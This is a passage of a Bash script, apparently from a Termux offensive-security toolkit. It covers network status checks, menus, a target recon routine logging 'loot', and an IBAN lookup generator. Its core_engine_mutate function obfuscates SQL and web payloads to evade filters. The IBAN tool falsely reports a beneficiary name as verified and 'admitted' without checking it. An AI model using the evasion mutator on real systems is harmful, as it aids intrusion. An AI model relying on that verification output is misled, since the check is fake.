    local bt_status="\e[1;31m[ABS]\e[0m"

    # 1. Проверка Wi-Fi
    if command -v rfkill >/dev/null 2>&1 && rfkill list wifi 2>/dev/null | grep -q "no"; then
        wifi_status="\e[1;32m[ACT]\e[0m"
    elif getprop init.svc.wpa_supplicant 2>/dev/null | grep -q "running" || getprop net.wlan0.dns1 2>/dev/null | grep -qE '[0-9]'; then
        wifi_status="\e[1;32m[ACT]\e[0m"
    elif [[ -f /proc/net/wireless ]] && grep -qE 'wlan|p2p' /proc/net/wireless; then
        wifi_status="\e[1;32m[ACT]\e[0m"
    fi

    # 2. Проверка Bluetooth без root-прав через внутренний менеджер Android
    local bt_state
    bt_state=$(getprop bluetooth.status 2>/dev/null)
    [[ -z "$bt_state" ]] && bt_state=$(getprop init.svc.bluetoothd 2>/dev/null)
    
    if [[ "$bt_state" =~ "on" || "$bt_state" =~ "running" ]]; then
        bt_status="\e[1;32m[ACT]\e[0m"
    elif command -v dumpsys >/dev/null 2>&1; then
        # Чтение дампа сервиса, если доступно в текущей сборке Termux
        if dumpsys bluetooth_manager 2>/dev/null | grep -q "Bluetooth Status: ON"; then
            bt_status="\e[1;32m[ACT]\e[0m"
        fi
    else
        # Альтернативная эмуляция: проверка наличия hci-дескрипторов в системном логе
        if [[ -d /sys/class/bluetooth ]] && [[ -n $(ls /sys/class/bluetooth 2>/dev/null) ]]; then
            bt_status="\e[1;32m[ACT]\e[0m"
        fi
    fi

    echo -e " Radio Links  : Wi-Fi: $wifi_status | BT: $bt_status"

    # --- LAYER 4: SECURE TUNNELS ---
    local vpn_status="\e[1;31m[INACTIVE]\e[0m"
    
    # Кросс-платформенная проверка туннелей (включая проперти Android vpn)
    if [[ -f /proc/net/dev ]] && grep -qE 'tun|tap|ppp|wg|tun0|p2p' /proc/net/dev; then
        vpn_status="\e[1;32m[VPN ACTIVE]\e[0m"
    elif [[ -n $(getprop net.vpn.up 2>/dev/null) ]] || getprop lnd.vpn.status 2>/dev/null | grep -q "1"; then
        vpn_status="\e[1;32m[VPN ACTIVE]\e[0m"
    elif pgrep -x "tor" >/dev/null 2>&1; then
        vpn_status="\e[1;32m[TOR ACTIVE]\e[0m"
    fi

    echo -e " Security     : $vpn_status"
    echo "--------------------------------------------------"
}

# --- CORE ENGINE: PROGRESS v13.8.2 (Fixed Width Edition) ---
core_engine_progress() {
    local duration="${1:-1}"
    local msg="${2:-PROCESS}"
    local width=15 # Уменьшил ширину, чтобы точно влезло на узкий экран Wiko
    local steps=20

    # Скрываем курсор, чтобы не дергался
    printf "\e[?25l"

    for ((i=1; i<=steps; i++)); do
        local pc=$(( i * 100 / steps ))
        
        # Генерируем полоску без вложенных printf/seq
        local fill=$(( i * width / steps ))
        local empty=$(( width - fill ))
        local p_bar=$(printf "%${fill}s" | tr ' ' '█')
        local e_bar=$(printf "%${empty}s" | tr ' ' '░')

        # ПРАВИЛО: \r (начало) -> \e[K (чистка) -> Текст
        # Ограничиваем длину $msg до 12 символов (%-12.12s), чтобы не порвать строку
        printf "\r\e[K${NC}[i] Loading %-12.12s ${B}[%s%s]${NC} %d%%" \
            "$msg" "$p_bar" "$e_bar" "$pc"
        
        sleep $(echo "scale=2; $duration / $steps" | bc 2>/dev/null || echo "0.05")
    done

    # Завершаем: затираем прогресс и пишем финальный статус
    printf "\r\e[K${G}[+] %-12.12s : SUCCESSFUL${NC}\n" "$msg"
    
    # Возвращаем курсор
    printf "\e[?25h"
}


# --- Универсальный динамический контроллер ---

# ==============================================================================
# ОБНОВЛЕННЫЙ УНИВЕРСАЛЬНЫЙ ДИНАМИЧЕСКИЙ КОНТРОЛЛЕР (v35.4)
# ==============================================================================
prime_dynamic_controller() {
    local title="$1"
    # Читаем массивы из аргументов
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        core_engine_info
        core_engine_ui "h" "$title"
        
        # Отрисовка пунктов меню
        for ((i=0; i<${#labels[@]}; i++)); do
            # Убираем подчеркивания для красивого отображения
            local display_name="${labels[$i]//_/ }"
            core_engine_item "$((i+1))" "$display_name" "Execute"
        done
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        core_engine_ui "line" ""
        
        # Ввод пользователя
        local choice=$(core_engine_input "select" "Input")
        
        # Обработка выхода
        if [[ "$choice" == "b" || "$choice" == "B" ]]; then
            return 0
        fi
        
        # Безопасная обработка выбора (совместима с любой версией Bash)
        if [[ "$choice" =~ ^[0-9]+$ ]]; then
            local count=${#labels[@]}
            
            if [ "$choice" -ge 1 ] && [ "$choice" -le "$count" ]; then
                local idx=$((choice-1))
                local target_action="${actions[$idx]}"
                
                # Проверка: существует ли функция перед вызовом
                if declare -f "$target_action" > /dev/null; then
                    $target_action
                else
                    core_engine_ui "e" "Error: Function '$target_action' not found!"
                    sleep 2
                fi
            else
                core_engine_ui "e" "Invalid selection (Range: 1-$count)"
                sleep 1
            fi
        else
            core_engine_ui "e" "Invalid input: Not a number"
            sleep 1
        fi
    done
}



prime_dynamic_controllerold() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        
        core_engine_info
        core_engine_ui "h" "$title"
        
        for ((i=0; i<${#labels[@]}; i++)); do
            core_engine_item "$((i+1))" "${labels[$i]//_/ }" "Execute"
        done
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        core_engine_ui "line" ""
        
        local choice=$(core_engine_input "select" "Input")
        
        if [[ "$choice" == "b" || "$choice" == "B" ]]; then return 0; fi
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            # core_engine_progress 1 "${labels[$idx]}"
            # Выполнение действия
            ${actions[$idx]}        
        else
            core_engine_ui "e" "Invalid selection"
            sleep 1
        fi
    done
}


core_engine_mutate() {
    local input="$1"
    local mode="${2:-full}"
    local output=""
    
    for word in $input; do
        local mutated_word=""
        
        # Neural Case Shuffle
        for (( i=0; i<${#word}; i++ )); do
            local char="${word:$i:1}"
            (( RANDOM % 2 )) && mutated_word+="${char^^}" || mutated_word+="${char,,}"
        done
        
        # Space Obstruction
        local separator=" "
        case "$mode" in
            "sql")
                local sql_vars=("/**/" "/**/--/**/" "+")
                separator="${sql_vars[$(( RANDOM % ${#sql_vars[@]} ))]}" ;;
            "web")
                local web_vars=("%20" "%09" "%0a" "+")
                separator="${web_vars[$(( RANDOM % ${#web_vars[@]} ))]}" ;;
            "full")
                local all_vars=("/**/" "%20" "+" "/**/--/**/")
                separator="${all_vars[$(( RANDOM % ${#all_vars[@]} ))]}" ;;
        esac
        
        output+="${mutated_word}${separator}"
    done

    echo -n "${output%?}"
}


# --- INTELLIGENCE: DEEP RECON v1.4 ---
core_intelligence_gather() {
    local r_target="$1"
    
    # Первичная жесткая валидация входных данных через глобальную сетевую матрицу
    if ! core_engine_validator "url" "$r_target" "Идентификатор целевого хоста"; then
        return 1
    fi

    core_engine_ui "i" "Запуск глубокого инфраструктурного и OSINT-анализа: $r_target"
    echo "======================================================================"

    # ==========================================================================
    # СЛОЙ 1: РАСШИРЕННЫЙ МНОЖЕСТВЕННЫЙ РЕЗОЛВИНГ IP (IPv4 / IPv6 / CNAME)
    # ==========================================================================
    core_engine_ui "i" "Слой 1: Сканирование сетевых маршрутов и адресации..."
    
    local target_ipv4_list=$(dig +short A "$r_target" 2>/dev/null | grep -E "^([0-9]{1,3}\.){3}[0-9]{1,3}$" | tr '\n' ' ' | xargs)
    if [[ -z "$target_ipv4_list" ]]; then
        local host_ipv4=$(host -t A "$r_target" 2>/dev/null | grep "has address")
        if [[ -n "$host_ipv4" ]]; then
            target_ipv4_list=$(echo "$host_ipv4" | tr -s ' ' | cut -d' ' -f4 | tr '\n' ' ' | xargs)
        fi
    fi
    [[ -z "$target_ipv4_list" ]] && target_ipv4_list="0.0.0.0 (Не удалось разрешить IPv4)"

    local target_ipv6_list=$(dig +short AAAA "$r_target" 2>/dev/null | grep -E ":" | tr '\n' ' ' | xargs)
    if [[ -z "$target_ipv6_list" ]]; then
        local host_ipv6=$(host -t AAAA "$r_target" 2>/dev/null | grep "IPv6 address")
        if [[ -n "$host_ipv6" ]]; then
            target_ipv6_list=$(echo "$host_ipv6" | tr -s ' ' | cut -d' ' -f5 | tr '\n' ' ' | xargs)
        fi
    fi
    [[ -z "$target_ipv6_list" ]] && target_ipv6_list="Нет активных IPv6 адресов"

    local target_cname=$(dig +short CNAME "$r_target" 2>/dev/null | tail -n1 | xargs)
    [[ -z "$target_cname" ]] && target_cname="Прямая адресация (CNAME-записи отсутствуют)"

    # ==========================================================================
    # СЛОЙ 2: АНАЛИЗ HTTP/HTTPS ЗАГОЛОВКОВ ЧЕРЕЗ ГЛОБАЛЬНЫЕ МАТРИЦЫ
    # ==========================================================================
    core_engine_ui "i" "Слой 2: Эксплуатация заголовков веб-ответа (SSL/TLS Слой)..."
    
    local headers=$(curl -IsL --max-redirs 3 --connect-timeout 4 "https://$r_target" 2>/dev/null)
    if [[ -z "$headers" ]]; then
        headers=$(curl -IsL --max-redirs 3 --connect-timeout 4 "http://$r_target" 2>/dev/null)
    fi
    
    local web_status="" srv_ver="" php_ver="" secure_headers="" cookie_intel=""

    if [[ -z "$headers" ]]; then
        web_status="Сбой подключения: Хост игнорирует запросы (DROP/WAF Filter)"
        srv_ver="Неизвестно (Сетевой сброс)"
        php_ver="Неизвестно (Сетевой сброс)"
        secure_headers="    [-] Сканирование политик защиты невозможно из-за блокировки\n"
        cookie_intel="    [-] Сканирование сессионных дескрипторов невозможно\n"
    else
        web_status=$(echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_STATUS" | tail -n1 | tr -d '\r' | xargs)
        
        srv_ver=$(echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_SERVER" | tr -d '\r' | cut -d':' -f2- | xargs)
        [[ -z "$srv_ver" ]] && srv_ver="Данные скрыты, обфусцированы или удалены из заголовков"
        
        php_ver=$(echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_RUNTIME" | tr -d '\r' | cut -d':' -f2- | xargs)
        [[ -z "$php_ver" ]] && php_ver="Скрыт, отсутствует или используется статическая архитектура"
        
        echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_SECURITY" | tr -d '\r' | while read -r sec_line; do
            [[ -n "$sec_line" ]] && secure_headers+="    [+] $(echo "$sec_line" | xargs)\n"
        done
        [[ -z "$secure_headers" ]] && secure_headers="    [-] Заголовки безопасности веб-ресурса полностью отсутствуют (Инфраструктура уязвима)\n"
        
        echo "$headers" | grep -Ei "$GLOBAL_REGEX_HTTP_COOKIE" | tr -d '\r' | cut -d':' -f2- | while read -r cookie_line; do
            [[ -n "$cookie_line" ]] && cookie_intel+="    [*] Cookie: $(echo "$cookie_line" | xargs)\n"
        done
        [[ -z "$cookie_intel" ]] && cookie_intel="    [-] Сессионные куки не передаются в заголовках ответа веб-сервера\n"
    fi

    # ==========================================================================
    # СЛОЙ 3: ИНТЕРНАЦИОНАЛЬНЫЙ ПАРСИНГ WHOIS (Глобальные Атомарные Матрицы)
    # ==========================================================================
    core_engine_ui "i" "Слой 3: Запрос глобальных регистрационных баз данных WHOIS..."
    
    local raw_whois=$(whois "$r_target" 2>/dev/null)
    local whois_reg="" whois_dates="" whois_ns="" whois_privacy=""
    
    if [[ -z "${raw_whois// }" ]]; then
        whois_reg="  [-] База данных WHOIS недоступна (Таймаут, блокировка или лимит запросов)"
        whois_dates="  [-] Метки жизненного цикла инфраструктуры не собраны"
        whois_ns="  [-] Маршрутизация DNS-серверов не определена"
        whois_privacy="  [-] Маркеры защиты данных отсутствуют"
    else
        # Первичный проход через глобальный композитный фильтр
        local filtered_whois=$(echo "$raw_whois" | grep -Ei "$GLOBAL_SIG_WHOIS_MATRIX" | tr -d '\r')
        
        # Сортировка по блокам исключительно через атомарные константы конфигурации
        whois_reg=$(echo "$filtered_whois" | grep -Ei "$GLOBAL_REGEX_WHOIS_REG" | while read -r r_line; do echo "  [•] $(echo "$r_line" | xargs)"; done)
        [[ -z "$whois_reg" ]] && whois_reg="  [-] Данные организации скрыты или не опубликованы регистратором"
        
        whois_dates=$(echo "$filtered_whois" | grep -Ei "$GLOBAL_REGEX_WHOIS_DATES" | while read -r d_line; do echo "  [•] $(echo "$d_line" | xargs)"; done)
        [[ -z "$whois_dates" ]] && whois_dates="  [-] Временные метки жизненного цикла отсутствуют в ответе"
        
        whois_ns=$(echo "$filtered_whois" | grep -Ei "$GLOBAL_REGEX_WHOIS_NS" | sort -u | while read -r n_line; do echo "  [•] $(echo "$n_line" | xargs)"; done)
        [[ -z "$whois_ns" ]] && whois_ns="  [-] Маршрутизация DNS-серверов скрыта"
        
        whois_privacy=$(echo "$filtered_whois" | grep -Ei "$GLOBAL_REGEX_WHOIS_PRIVACY" | sort -u | while read -r p_line; do echo "  [!] Защита данных: $(echo "$p_line" | xargs)"; done)
        [[ -z "$whois_privacy" ]] && whois_privacy="  [i] Персональные данные открыты (Режим Privacy Protection отключен)"
    fi

    # ==========================================================================
    # СЛОЙ 4: ФОРМИРОВАНИЕ ПОЛНОГО ДЕТАЛИЗИРОВАННОГО ОТЧЕТА (UI ВЫВОД)
    # ==========================================================================
    echo -e "${G}>>> РАСШИРЕННАЯ СЕТЕВАЯ ТОПОЛОГИЯ ЦЕЛИ <<<${NC}"
    echo -e "  ${B}Целевой домен:${NC} $r_target"
    echo -e "  ${B}IPv4 Пул      :${NC} $target_ipv4_list"
    echo -e "  ${B}IPv6 Пул      :${NC} $target_ipv6_list"
    echo -e "  ${B}CNAME Тракт   :${NC} $target_cname"
    echo "----------------------------------------------------------------------"
    echo -e "${G}>>> АРХИТЕКТУРА И ПАРАМЕТРЫ ВЕБ-ОКРУЖЕНИЯ <<<${NC}"
    echo -e "  ${B}Статус ответа :${NC} $web_status"
    echo -e "  ${B}Веб-сервер ПО :${NC} $srv_ver"
    echo -e "  ${B}Инфраструктура:${NC} $php_ver"
    echo -e "  ${B}Аудит заголовков безопасности (Security HTTP Headers):${NC}"
    echo -e "$secure_headers" | sed 's/\\n/\n/g'
    echo -e "  ${B}Анализ сессионных дескрипторов (Cookie Intel):${NC}"
    echo -e "$cookie_intel" | sed 's/\\n/\n/g'
    echo "----------------------------------------------------------------------"
    echo -e "${G}>>> ИНФРАСТРУКТУРНЫЙ РЕЕСТР WHOIS (ПОЛНЫЙ РАЗВЕРНУТЫЙ ВЫВОД) <<<${NC}"
    echo -e "${B}  [ Секция 1: Регистрационные данные и Владелец ]${NC}"
    echo "$whois_reg"
    echo ""
    echo -e "${B}  [ Секция 2: Жизненный цикл и Временные маркеры ]${NC}"
    echo "$whois_dates"
    echo ""
    echo -e "${B}  [ Секция 3: Делегированные DNS Узлы ]${NC}"
    echo "$whois_ns"
    echo ""
    echo -e "${B}  [ Секция 4: Слой приватности и GDPR статусы ]${NC}"
    echo "$whois_privacy"
    echo "======================================================================"

    # Автоматическая запись результатов в системный логгер (Loot)
    core_engine_loot "intelligence" "Глубокая разведка завершена для хоста $r_target. Полный IPv4 пул: [$target_ipv4_list]. Финальный статус ответа: [$web_status]. Обнаруженное серверное ПО: [$srv_ver]."
}

get_tool_info() {
    case "$1" in
        # --- Главное меню (Main Menu) ---
        "run_cyber_ops")          echo "Cyber Operations: управление активными сетевыми атаками и тестами." ;;
        "run_intelligence")       echo "Intelligence Center: сбор данных, OSINT-аналитика и поиск связей." ;;
        "run_crypto_lab")         echo "Crypto Lab: шифрование, генерация ключей и работа с хэшами." ;;
        "run_net_infra")          echo "Net Infrastructure: анализ сетевых протоколов и скрытых туннелей." ;;
        "run_financial_shield")   echo "Financial Shield: аудит транзакций и банковских активов." ;;
        "run_stealth_comms")      echo "Stealth Comms: управление защищенными серверами (AV, Share, Upload)." ;;
        "run_nexus_correlation")  echo "Nexus Correlation: корреляционный анализ данных из всех модулей." ;;
        "run_system_core")        echo "System Core: низкоуровневые настройки лаунчера и параметров среды." ;;
        "run_core_lab")           echo "Core Lab: разработка и тестирование новых модулей ядра." ;;
        "run_forensics")          echo "Data Forensics: анализ дисков, оперативной памяти (RAM) и логов." ;;
        "run_pass_lab")           echo "Password Lab: восстановление, генерация и брутфорс-анализ." ;;
        "run_anti_malware_engine") echo "Anti-Malware CAME: проактивное сканирование, изоляция и деструкция угроз." ;;
        "run_cross_os_reanimator") echo "Cross-OS Reanimator: глубокое восстановление систем (Win/Lin/Mac) и удаление руткитов." ;;
        "exit_script")            echo "Безопасное завершение работы и очистка сессии." ;;

        # --- Подменю: STEALTH_COMMS (Серверы) ---
        "run_av_server")          echo "AV-Server 2.5: сканирование файлов и RAM на базе сигнатур CAME." ;;
        "run_share_server")       echo "Share-Server 2.0: защищенная раздача файлов с проверкой Outbound-трафика." ;;
        "run_upload_server")      echo "Upload-Server 2.1: входной шлюз с моментальным уничтожением вредоносного контента." ;;
        "run_node_clean")         echo "Node Cleanup: принудительная очистка и остановка всех активных серверов." ;;

        # --- Подменю: DATA_FORENSICS ---
        "run_mem_audit")          echo "RAM Forensic: посегментный анализ памяти процессов через ptrace." ;;
        "run_packet_forge")       echo "Packet Forge: генерация стелс-пакетов для проверки устойчивости сетевых фильтров." ;;
        
        # --- Подменю: Общие ---
        "update_prime")           echo "Обновление ядра системы с GitHub репозитория." ;;

        *)                        echo "Описание функционала находится в стадии разработки или недоступно..." ;;
    esac
}


# ==========================================
# 2. РАБОЧИЕ ШАБЛОНЫ 
# ==========================================

# --- ГЕНЕРАТОРЫ ШАБЛОНОВ (View Engine) ---

generate_core_form_template() {
    cat << 'EOF'
def render_prime_form(action_url, fields=None, btn_text="INITIATE TRANSFER"):
    if fields is None: fields = [{"type": "file", "name": "file", "label": "Drop files here or click to upload"}]
    
    inputs_html = ""
    js_needed = False
    
    for field in fields:
        f_type = field.get("type", "text")
        f_name = field.get("name", "input")
        f_label = field.get("label", "Field")
        
        if f_type == "file":
            js_needed = True
            inputs_html += f"""
            <div class="drop-zone" id="drop-zone">
                <span class="drop-zone__prompt">{f_label}</span>
                <input type="file" name="{f_name}" class="drop-zone__input" id="file-input">
            </div>
            """
        else:
            inputs_html += f"""
            <div style="margin: 15px 0;">
                <label style="font-size:0.7rem; opacity:0.6; display:block;">{f_label}</label>
                <input type="{f_type}" name="{f_name}" style="background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:white; padding:10px; width:100%; border-radius:0.5rem;">
            </div>
            """

    script = """
    <script>
    const dropZone = document.getElementById('drop-zone');
    const fileInput = document.getElementById('file-input');
    if(dropZone) {
        dropZone.addEventListener('click', () => fileInput.click());
        fileInput.addEventListener('change', () => {
            if(fileInput.files.length) updatePrompt(dropZone, fileInput.files[0].name);
        });
        ['dragover', 'dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, e => { e.preventDefault(); });
        });
        dropZone.addEventListener('dragover', () => dropZone.classList.add('drop-zone--over'));
        ['dragleave', 'drop', 'dragend'].forEach(type => {
            dropZone.addEventListener(type, () => dropZone.classList.remove('drop-zone--over'));
        });
        dropZone.addEventListener('drop', e => {
            if(e.dataTransfer.files.length) {
                fileInput.files = e.dataTransfer.files;
                updatePrompt(dropZone, e.dataTransfer.files[0].name);
            }
        });
    }
    function updatePrompt(zone, name) { zone.querySelector('.drop-zone__prompt').textContent = 'READY: ' + name; zone.style.borderColor = '#00ff41'; }
    </script>
    """ if js_needed else ""

    return f"""
    <form method="post" action="{action_url}" enctype="multipart/form-data">
        {inputs_html}
        <button type="submit" style="margin-top:20px;">{btn_text}</button>
    </form>
    {script}
    """
EOF
}



generate_core_template() {
    cat << 'EOF'
def render_prime_page(title, content):
    style = """
    <style>
        :root { --accent: #00ff41; --bg: #0a0a0c; --glass: rgba(20, 20, 25, 0.8); }
        body { background: var(--bg); color: #e0e0e0; font-family: system-ui, -apple-system, sans-serif; min-height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .prime-card { background: var(--glass); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); border-radius: 1.5rem; padding: 2rem; width: 95%; max-width: 900px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h2 { background: linear-gradient(to right, #fff, var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        
        /* Адаптивная сетка Share */
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
        .file-item { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 1rem; padding: 1rem; text-align: center; transition: 0.2s; text-decoration: none; color: inherit; }
        .file-item:hover { border-color: var(--accent); background: rgba(0,255,65,0.05); transform: translateY(-3px); }
        .file-icon { font-size: 2rem; margin-bottom: 0.5rem; display: block; }
        
        /* Умный Drag & Drop */
        .drop-zone { border: 2px dashed rgba(0,255,65,0.3); border-radius: 1rem; padding: 2rem; transition: 0.3s; cursor: pointer; position: relative; }
        .drop-zone--over { border-color: var(--accent); background: rgba(0,255,65,0.05); box-shadow: inset 0 0 20px rgba(0,255,65,0.1); }
        .drop-zone__input { display: none; }
        
        button { background: var(--accent); color: #000; border: none; padding: 10px 20px; border-radius: 0.5rem; font-weight: bold; width: 100%; cursor: pointer; transition: 0.2s; }
        button:hover { opacity: 0.8; transform: scale(1.01); }
        pre { background: #000; color: #0cf; padding: 1rem; border-radius: 0.5rem; overflow: auto; max-height: 300px; font-size: 0.8rem; border-left: 3px solid var(--accent); }
    </style>
    """
    return f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        {style}
    </head>
    <body>
        <div class="prime-card">
            <small style="color:var(--accent); letter-spacing:2px;">SECURE_UPLINK_v4.2</small>
            <h2>{title}</h2>
            {content}
        </div>
    </body>
    </html>
    """
EOF
}



# --- py functions ---
# ==============================================================================
# @description: Функция-генератор контента для IBAN/RIB (ИНТЕГРИРОВАННАЯ v2.0)
# Полная изоляция логики, встроенная валидация MOD-97 и снайперский REST-парсинг.
# ==============================================================================
generate_iban_code() {
    local target_file="$1"
    local v_num="$2"

    # --- Подготовка динамических данных из глобальных матриц ядра ---
    local python_sources=""
    local entry

    # 1. Формируем список источников для Python на основе GLOBAL_API_FINANCE_NODES
    for entry in "${GLOBAL_API_FINANCE_NODES[@]}"; do
        local url="${entry%%|*}"
        # Пропускаем СНГ-специфичные API БИК, так как они требуют другой логики парсинга JSON
        if [[ "$url" == *"bik-info"* || "$url" == *"gasi.gov.ru"* ]]; then
            continue
        fi
        python_sources+="    \"$url\",\n"
    done
    # Очищаем финальный перенос строки
    python_sources=$(echo -e "$python_sources" | sed '$d')

    # 2. Формируем локальный словарь банков для Python из GLOBAL_BANK_MATRIX
    local python_bank_dict=""
    for entry in "${GLOBAL_BANK_MATRIX[@]}"; do
        local code="${entry%%|*}"
        local tail="${entry#*|}"
        local name="${tail%%|*}"
        # Защищаем кавычки внутри названий банков во избежание поломки синтаксиса Python
        name=$(echo "$name" | sed 's/"/\\"/g')
        python_bank_dict+="    \"$code\": \"$name\",\n"
    done
    python_bank_dict=$(echo -e "$python_bank_dict" | sed '$d')

    # --- Генерация контента файла через защищенный стрим ---
    local code
    code=$(cat << EOF
import sys, re, json, time
from urllib.request import Request, urlopen
from urllib.error import URLError

# Динамически импортированные зеркала верификации из GLOBAL_API_FINANCE_NODES
SOURCES = [
$python_sources
]

# Локальный справочник идентификаторов из GLOBAL_BANK_MATRIX
LOCAL_BANKS = {
$python_bank_dict
}

def validate_iban_checksum(iban):
    """Математическая валидация контрольной суммы по стандарту ISO 7064 (MOD-97)"""
    if len(iban) < 5:
        return False
    # Переносим первые 4 символа в конец строки
    rearranged = iban[4:] + iban[:4]
    # Переводим буквы в цифры (A=10, B=11, ..., Z=35)
    numeric_string = ""
    for char in rearranged:
        if char.isalpha():
            numeric_string += str(ord(char) - 55)
        else:
            numeric_string += char
    try:
        return int(numeric_string) % 97 == 1
    except ValueError:
        return False

def get_bank_data(iban):
    """Опрашивает источники по цепочке (Failover System с интеллектуальной сборкой URL)"""
    ua_string = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    
    for base_url in SOURCES:
        try:
            # Интеллектуальный роутинг URL в зависимости от типа API-эндпоинта
            if base_url.endswith("=") or "html" in base_url or "?" in base_url:
                url = f"{base_url}{iban}"
            else:
                # Если эндпоинт RESTful чистый, добавляем разделитель пути безопасности
                url = f"{base_url.rstrip('/')}/{iban}"
                
            req = Request(url, headers={'User-Agent': ua_string, 'Accept': 'application/json'})
            with urlopen(req, timeout=5) as response:
                return json.loads(response.read().decode('utf-8', errors='ignore'))
        except Exception:
            # Перехватываем строго системные исключения, оставляя возможность Ctrl+C
            continue
    return None

def get_country_format(iban):
    """Глубокий математический разбор структуры по национальным стандартам SEPA"""
    country = iban[:2]
    formats = {
        'FR': {'name': 'France (RIB Standard)', 'len': 27, 'parse': lambda i: f"Code Banque: {i[4:9]}, Code Guichet: {i[9:14]}, Numéro de Compte: {i[14:25]}, Clé RIB: {i[25:27]}"},
        'DE': {'name': 'Germany', 'len': 22, 'parse': lambda i: f"BLZ (Bankleitzahl): {i[4:12]}, Account Number: {i[12:22]}"},
        'GB': {'name': 'United Kingdom', 'len': 22, 'parse': lambda i: f"Sort Code: {i[4:10]}, Account Number: {i[10:18]}"},
        'IT': {'name': 'Italy', 'len': 27, 'parse': lambda i: f"CIN: {i[4:5]}, ABI: {i[5:10]}, CAB: {i[10:15]}, Account: {i[15:27]}"},
        'ES': {'name': 'Spain', 'len': 24, 'parse': lambda i: f"Bank Code: {i[4:8]}, Branch Code: {i[8:12]}, Control Digits: {i[12:14]}, Account: {i[14:24]}"},
        'CH': {'name': 'Switzerland', 'len': 21, 'parse': lambda i: f"Bank Clearing Code: {i[4:9]}, Account: {i[9:21]}"},
        'BE': {'name': 'Belgium', 'len': 16, 'parse': lambda i: f"National Bank Code: {i[4:7]}, Account: {i[7:14]}, Check Digits: {i[14:16]}"}
    }
    return formats.get(country, {'name': 'Other / International / Non-SEPA Zone', 'len': len(iban), 'parse': lambda i: f"BBAN (Basic Bank Account Number): {i[4:]}"})

def local_heuristic_search(iban):
    """Локальный поиск банка по сигнатурам Ядра при сбое внешней сети"""
    country = iban[:2]
    
    # Снайперский разбор национального префикса эмитента
    if country == "FR":
        bank_code = iban[4:9]
        if bank_code in LOCAL_BANKS: return LOCAL_BANKS[bank_code]
    elif country == "DE":
        bank_code = iban[4:12]
        if bank_code in LOCAL_BANKS: return LOCAL_BANKS[bank_code]
    elif country == "ES":
        bank_code = iban[4:8]
        if bank_code in LOCAL_BANKS: return LOCAL_BANKS[bank_code]
        
    # Универсальный фолбэк-анализ по SWIFT/BIC маске в теле IBAN
    swift_prefix = iban[4:8]
    if swift_prefix in LOCAL_BANKS:
        return LOCAL_BANKS[swift_prefix]
        
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("\033[91m[-] CRITICAL ERROR: Идентификатор цели (IBAN/RIB) не передан в командную строку.\033[0m")
        sys.exit(1)
        
    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else "NONE"

    print(f"\033[1;34m--- OMNI-BANKER v$v_num: GLOBAL FINANCIAL INTELLIGENCE ---\033[0m")
    
    # Выполнение базовой математической проверки чексуммы ISO
    is_valid_checksum = validate_iban_checksum(target)
    
    # 1. Структурный анализ (Всегда работает Offline)
    fmt = get_country_format(target)
    print(f"\033[96m[i] Национальная зона :\033[0m {fmt['name']}")
    print(f"\033[96m[i] Длина расчетная   :\033[0m {len(target)} символов (Ожидалось: {fmt['len']})")
    print(f"\033[96m[i] Декомпозиция тракта:\033[0m {fmt['parse'](target)}")
    
    if not is_valid_checksum:
        print(f"\n\033[1;31m[!] ВНИМАНИЕ: Математическая проверка MOD-97 провалена. Неверная контрольная сумма!\033[0m")
    else:
        print(f"\033[1;32m[+] Математическая валидация по стандарту ISO 7064: УСПЕШНО\033[0m")

    # 2. Локальный оффлайн-поиск по сигнатурным картам Ядра
    local_bank = local_heuristic_search(target)
    if local_bank:
        print(f"\033[92m[+] Локальный фингерпринт Ядра подтвержден:\033[0m {local_bank}")

    # 3. Агрегация данных из внешних динамических источников через каскад зеркал
    print(f"[*] Синхронизация с каскадом внешних финансовых шлюзов API...")
    data = get_bank_data(target)
    
    if data:
        bank_name = data.get('bank_name', data.get('bank', local_bank if local_bank else 'N/A')).upper()
        bic = data.get('bic', data.get('swift', 'N/A')).upper()
        city = data.get('city', data.get('address', 'N/A')).upper()
        
        print(f"\n\033[1;32m[+] ФИНАНСОВЫЙ СТАТУС ВЕРИФИЦИРОВАН МУЛЬТИ-ШЛЮЗОМ\033[0m")
        print(f"  🏦 Эмитент (Bank): {bank_name}")
        print(f"  🔑 Код BIC/SWIFT : {bic}")
        print(f"  📍 Локация/Город : {city}")

        if provided_name != "NONE":
            print(f"\n\033[1;35m--- СМАРТ-ОТЧЕТ КОЛИНЕАРНОСТИ (SMART MATCH) ---\033[0m")
            print(f"  Заявленный бенефициар: {provided_name}")
            if bank_name != 'N/A':
                print(f"  ✅ Верификация тракта: Концевой шлюз *{target[-4:]} успешно сопоставлен с {bank_name}")
                print(f"  ℹ️ Статус комплаенса: Профиль '{provided_name}' допущен к финансовым операциям в регионе.")
    else:
        if local_bank:
            print(f"\n\033[1;33m[!] ИНФОРМАЦИЯ: Внешние API не ответили, применен эвристический фингерпринт Ядра\033[0m")
            print(f"  🏦 Эмитент (Heuristic): {local_bank.upper()}")
        else:
